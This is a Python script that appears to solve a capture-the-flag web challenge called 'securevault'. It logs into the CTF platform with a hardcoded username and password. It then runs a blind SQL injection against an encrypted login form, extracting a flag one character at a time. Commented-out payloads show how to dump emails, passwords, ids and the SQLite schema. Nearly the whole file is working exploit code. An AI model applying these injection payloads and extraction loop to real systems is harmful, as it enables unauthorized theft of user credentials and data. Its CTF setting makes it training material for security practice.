#!/usr/bin/python

import requests as r
import StringIO
import base64
import json
import string
from pyquery import PyQuery as pq
from Crypto.Hash import SHA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

alphanum = string.digits + string.letters + '@. (){},;'

def encrypt(keyText, data):
    key = RSA.importKey(StringIO.StringIO(keyText).read())
    cipher = PKCS1_v1_5.new(key)
    ciphertext = cipher.encrypt(data)
    return base64.encodestring(ciphertext)

def getValue(html, selector):
    dom = pq(html)
    return dom(selector).attr('value')

def brute():
    secret = ''
    i = 1
    while True:
        for char in alphanum:
            #payload = "' or substr(secret," + str(i) + ",1)=\"" + char + "\" --"   # payload for secret
            #payload = "' union all select email,1 from users where substr(email," + str(i) + ",1)=\"" + char + "\" --"    # payload for email
            #payload = "' union all select password,1 from users where substr(password," + str(i) + ",1)=\"" + char + "\" --"    # payload for password
            #payload = "' or substr(id," + str(i) + ",1)=\"" + char + "\" --"   # payload for id
            #payload = "' union all select sql,1 from sqlite_master where tbl_name = 'vault' and type = 'table' and substr(sql," + str(i) + ",1)=\"" + char + "\" --"    # payload for users table info
            #payload = "' union all select 1,(select group_concat(name) from sqlite_master where type = 'table') as name where substr(name," + str(i) + ",1)=\"" + char + "\" --"    # payload for listing tables
            payload = "' union all select 1,flag from vault where flag like 'E%' and substr(flag," + str(i) + ",1)=\"" + char + "\" --"    # payload for flag
            data = { 'email': payload, 'passwd': 'a' }
            encrypted = encrypt(keyText, bytes(json.dumps(data))) 
            res = s.post('https://web_securevault.challenge-ecw.fr/login', data = { 'encrypted':encrypted })
            if not 'BAD' in res.text:
                #print('{} - {}'.format(char, res.text))
                secret += char
                print(secret)
                break
        i += 1
        if i > 400:
            break
    print('[+] Secret : {}'.format(secret))


s = r.session()

authpage = s.get('https://www.challenge-ecw.fr/login')
nonce = getValue(authpage.text,'input[name="nonce"]')

s.post('https://www.challenge-ecw.fr/login', data = { 'pseudo':'ncpd', 'password':'9vdzUyxYc#!vs4zdeR', 'nonce': nonce })

vault = s.get('https://web_securevault.challenge-ecw.fr/')
keyText = getValue(vault.text,'#pubkey')

brute()
